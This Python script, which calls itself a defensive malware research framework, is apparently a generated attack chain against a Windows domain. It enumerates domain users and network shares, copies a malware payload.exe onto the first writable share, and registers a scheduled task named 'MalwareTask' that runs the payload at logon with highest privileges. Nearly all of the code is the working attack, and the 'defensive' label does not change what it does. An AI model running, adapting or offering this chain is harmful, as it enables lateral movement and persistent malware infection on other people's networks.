#!/usr/bin/env python3
"""Defensive Malware Research Framework"""

import sys
import json
import time
from typing import Dict, Any
import subprocess
import shutil
import os

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Command to list domain users
        command = ['net', 'user', '/domain']
        result = subprocess.run(command, capture_output=True, text=True, timeout=10)

        users = []
        if result.returncode == 0:
            # Parse the output to extract user names
            lines = result.stdout.splitlines()
            for line in lines:
                # Assuming user names are listed in lines without leading spaces
                if line and not line.startswith(' '):
                    users.extend(line.split())

        return {'success': True, 'data': {'users': users},
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'users': []}, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Use 'net view' command to list shared network drives
        result = subprocess.run(['net', 'view'], capture_output=True, text=True, timeout=10)
        shares = []

        if result.returncode == 0:
            # Parse the output to extract shared drive names
            for line in result.stdout.splitlines():
                if '\\\\' in line:
                    shares.append(line.split()[0])

        return {'success': True, 'data': {'shares': shares},
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'shares': []},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        shares = input_data.get('shares', [])
        payload_path = "C:\\path\\to\\malware\\payload.exe"  # Local path to the malware payload
        destination_path = ""

        # Attempt to copy the payload to the first available share
        for share in shares:
            try:
                destination_path = os.path.join(share, "payload.exe")
                shutil.copy(payload_path, destination_path)
                return {'success': True, 'data': {'destination_path': destination_path},
                        'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
            except Exception as e:
                continue  # Try the next share if copy fails

        # If no shares were successful
        return {'success': False, 'data': {'destination_path': ''},
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract input data
        success = input_data.get('success', False)
        destination_path = input_data.get('destination_path', '')

        # Initialize result
        task_created = False

        # Only proceed if the previous task was successful
        if success and destination_path:
            # Define the command to create a scheduled task
            task_name = "MalwareTask"
            command = f'schtasks /create /tn {task_name} /tr "{destination_path}" /sc onlogon /rl highest'
            
            # Execute the command to create the scheduled task
            subprocess.run(command, shell=True, check=True, timeout=10)
            task_created = True

        # Prepare the result
        result = {'task_created': task_created}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result on failure
        result = {'task_created': False}
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Enumerate Domain Users [discovery] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Enumerate Domain Users): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Enumerate Domain Users): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Enumerate Shared Network Drives [discovery] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Enumerate Shared Network Drives): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Enumerate Shared Network Drives): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Copy Malware Payload to Remote Share [lateral-movement] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Copy Malware Payload to Remote Share): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Copy Malware Payload to Remote Share): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Execute Malware via Scheduled Task [persistence] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Execute Malware via Scheduled Task): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Execute Malware via Scheduled Task): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))